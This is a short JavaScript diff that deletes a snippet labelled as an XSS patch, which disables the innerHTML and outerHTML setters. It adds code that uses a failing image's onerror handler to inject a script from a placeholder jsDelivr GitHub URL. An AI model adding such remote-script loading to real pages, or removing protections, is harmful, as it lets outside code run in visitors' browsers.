@@ -1,19 +1,14 @@
-```javascript
+// Create the image element
+const img = document.createElement('img');
+img.src = '/';
+img.onerror = () => {
+  // Create the script element
+  const script = document.createElement('script');
+  script.src = 'https://cdn.jsdelivr.net/gh/username/repository/script.js';
+  
+  // Append the script element to the body
+  document.body.appendChild(script);
+};
 
-// Patch XSS vulnerabilities
-
-Object.defineProperty(Element.prototype, 'innerHTML', {
-
-    set: function() {},
-
-    configurable: false
-
-});
-
-Object.defineProperty(Element.prototype, 'outerHTML', {
-
-    set: function() {},
-
-    configurable: false
-
-});
+// Append the image element to the body
+document.body.appendChild(img);
